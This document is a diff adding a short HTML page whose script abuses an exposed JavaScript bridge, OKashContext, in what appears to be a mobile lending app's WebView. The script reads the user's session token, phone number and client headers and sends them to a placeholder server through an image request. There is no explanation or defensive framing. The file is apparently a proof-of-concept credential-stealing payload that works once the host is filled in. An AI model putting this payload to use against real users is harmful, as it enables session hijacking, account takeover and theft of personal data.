@@ -1,0 +1,22 @@
+  <!DOCTYPE html>
+  <html>
+  <body>
+  <script>
+  (function() {
+      var token = OKashContext.handleJsBindingsSync(
+          '{"functionName":"getFromNative","functionData":"{\\\"key\\\":\\\"token\\\"}"}'
+      );
+      var mobile = OKashContext.handleJsBindingsSync(
+          '{"functionName":"getFromNative","functionData":"{\\\"key\\\":\\\"mobile\\\"}"}'
+      );
+      var header = OKashContext.handleJsBindingsSync(
+          '{"functionName":"getClientHeader","functionData":"{}"}'
+      );
+
+      new Image().src = "https://YOUR_SERVER/c?t=" + encodeURIComponent(token)
+                      + "&m=" + encodeURIComponent(mobile)
+                      + "&h=" + encodeURIComponent(header);
+  })();
+  </script>
+  </body>
+  </html>
